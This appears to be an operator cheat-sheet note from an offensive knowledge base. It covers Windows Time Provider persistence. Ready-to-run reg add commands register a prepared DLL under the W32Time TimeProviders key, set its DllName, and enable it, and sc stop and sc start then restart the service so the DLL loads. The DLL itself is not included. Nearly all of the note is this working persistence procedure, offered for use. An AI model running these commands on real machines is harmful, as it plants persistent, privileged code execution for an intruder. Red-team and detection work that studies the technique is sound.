---
technique: Time Provider Persistence
category: persistence
targets: Windows Time Service
protocols: Local
remote_capable: false
tags: windows persistence time-provider w32time dll
---

# Time Provider Persistence

Time provider persistence registers a prepared DLL that the Windows Time service can load as a time provider.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Administrative access | W32Time provider registry changes require admin |
| Prepared DLL | Payload construction belongs in a tool or payload note |
| Service restart | W32Time must reload providers |

## Windows

### Query time providers

#cmd #registry #w32time

List configured Windows Time providers.

```cmd title:"Query time providers"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders"
```
<!-- cheat -->

### Step 1: Create provider key

#cmd #registry #w32time

Create a Windows Time provider key.

```cmd title:"Create time provider key"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\$provider_name" /f
```
<!-- cheat
var provider_name
-->

### Step 2: Set provider DLL

#cmd #registry #w32time

Set the provider DLL path.

```cmd title:"Set time provider DLL"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\$provider_name" /v DllName /t REG_EXPAND_SZ /d "$dll_path" /f
```
<!-- cheat
var provider_name
var dll_path
-->

### Step 3: Enable provider

#cmd #registry #w32time

Enable the time provider.

```cmd title:"Enable time provider"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\$provider_name" /v Enabled /t REG_DWORD /d 1 /f
```
<!-- cheat
var provider_name
-->

### Step 4: Stop time service

#cmd #services #w32time

Stop the Windows Time service before starting it again.

```cmd title:"Stop Windows Time service"
sc stop W32Time
```
<!-- cheat -->

### Step 5: Start time service

#cmd #services #w32time

Start the Windows Time service to reload providers.

```cmd title:"Start Windows Time service"
sc start W32Time
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers Windows Time Provider persistence.
